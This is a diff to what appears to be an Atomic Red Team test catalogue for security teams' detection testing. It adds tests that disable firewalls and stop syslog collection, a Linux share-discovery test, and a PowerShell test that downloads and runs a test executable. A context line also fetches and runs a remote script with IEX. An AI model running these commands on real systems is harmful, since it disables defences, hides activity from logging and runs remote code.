@@ -29670,26 +29670,29 @@ defense-evasion:
       - Windows
       identifier: T1562.004
     atomic_tests:
-    - name: Disable iptables firewall
+    - name: Disable firewall
       auto_generated_guid: 80f5e701-f7a4-4d06-b140-26c8efd1b6b4
-      description: 'Disables the iptables firewall
+      description: 'Disables the firewall
 
 '
       supported_platforms:
       - linux
+      input_arguments:
+        flavor_command:
+          description: Command to disable firewall. Default firewalld. ufw (Ubuntu)
+            command = ufw disable
+          type: String
+          default: systemctl stop firewalld ; systemctl disable firewalld
+        cleanup_command:
+          description: Command to enable firewall. Default firewalld. ufw (Ubuntu)
+            command = ufw enable
+          type: String
+          default: systemctl enable firewalld ; systemctl start firewalld
       executor:
-        command: |
-          if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
-          then
-            service iptables stop
-            chkconfig off iptables
-            service ip6tables stop
-            chkconfig off ip6tables
-          else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
-            systemctl stop firewalld
-            systemctl disable firewalld
-          fi
+        command: "#{flavor_command}\n"
+        cleanup_command: "#{cleanup_command}\n"
         name: sh
+        elevation_required: true
     - name: Disable Microsoft Defender Firewall
       auto_generated_guid: 88d05800-a5e4-407e-9b53-ece4174f197f
       description: |
@@ -29831,17 +29834,41 @@ defense-evasion:
 '
       supported_platforms:
       - linux
+      input_arguments:
+        package_checker:
+          description: Package checking command for linux. Default rpm
+          type: string
+          default: rpm -q rsyslog
+        package_installer:
+          description: Package installer command for linux. Default yum
+          type: string
+          default: yum install -y rsyslog
+        flavor_command:
+          description: Command to disable syslog collection. Default newer rsyslog
+            commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog
+          type: String
+          default: systemctl stop rsyslog ; systemctl disable rsyslog
+        cleanup_command:
+          description: Command to enable syslog collection. Default newer rsyslog
+            commands. i.e older command = service rsyslog start ; chkconfig rsyslog
+            on
+          type: String
+          default: systemctl start rsyslog ; systemctl enable rsyslog
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Package with rsyslog must be on system
+
+'
+        prereq_command: 'if #{package_checker} > /dev/null; then exit 0; else exit
+          1; fi
+
+'
+        get_prereq_command: "sudo #{package_installer} \n"
       executor:
-        command: |
-          if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
-          then
-            service rsyslog stop
-            chkconfig off rsyslog
-          else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
-            systemctl stop rsyslog
-            systemctl disable rsyslog
-          fi
+        command: "#{flavor_command}\n"
+        cleanup_command: "#{cleanup_command}\n"
         name: sh
+        elevation_required: true
     - name: Disable Cb Response
       auto_generated_guid: ae8943f7-0f8d-44de-962d-fbc2e2f03eb8
       description: 'Disable the Cb Response service
@@ -47559,7 +47586,6 @@ discovery:
 '
       supported_platforms:
       - macos
-      - linux
       input_arguments:
         computer_name:
           description: Computer name to find a mount on.
@@ -47571,6 +47597,38 @@ discovery:
           smbutil view -g //#{computer_name}
           showmount #{computer_name}
         name: sh
+    - name: Network Share Discovery - linux
+      auto_generated_guid: 875805bc-9e86-4e87-be86-3a5527315cae
+      description: 'Network Share Discovery using smbstatus
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        package_checker:
+          description: Package checking command. Debian - dpkg -s samba
+          type: string
+          default: rpm -q samba
+        package_installer:
+          description: Package installer command. Debian - apt install samba
+          type: string
+          default: yum install -y samba
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Package with smbstatus (samba) must exist on device
+
+'
+        prereq_command: 'if #{package_checker} > /dev/null; then exit 0; else exit
+          1; fi
+
+'
+        get_prereq_command: "sudo #{package_installer} \n"
+      executor:
+        command: 'smbstatus --shares
+
+'
+        name: bash
+        elevation_require: true
     - name: Network Share Discovery command prompt
       auto_generated_guid: 20f1097d-81c1-405c-8380-32174d493bbb
       description: |
@@ -54494,6 +54552,38 @@ execution:
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
+    - name: Potentially Unwanted Applications (PUA)
+      auto_generated_guid: 02f35d62-9fdc-4a97-b899-a5d9a876d295
+      description: 'The Potentially Unwanted Applications (PUA) protection feature
+        in antivirus software can identify and block PUAs from downloading and installing
+        on endpoints in your network. These applications are not considered viruses,
+        malware, or other types of threats, but might perform actions on endpoints
+        that adversely affect their performance or use. This file is similar to EICAR
+        test virus file, but is considered a Potentially Unwanted Application (PUA)
+        instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify
+        anti-pua protection).
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        pua_url:
+          description: url to PotentiallyUnwanted.exe
+          type: url
+          default: http://amtso.eicar.org/PotentiallyUnwanted.exe
+        pua_file:
+          description: path to PotentiallyUnwanted.exe
+          type: Path
+          default: "$env:TEMP/PotentiallyUnwanted.exe"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
+          & "#{pua_file}"
+        cleanup_command: 'Remove-Item #{pua_file}
+
+'
   T1204.001:
     technique:
       created: '2020-03-11T14:43:31.706Z'
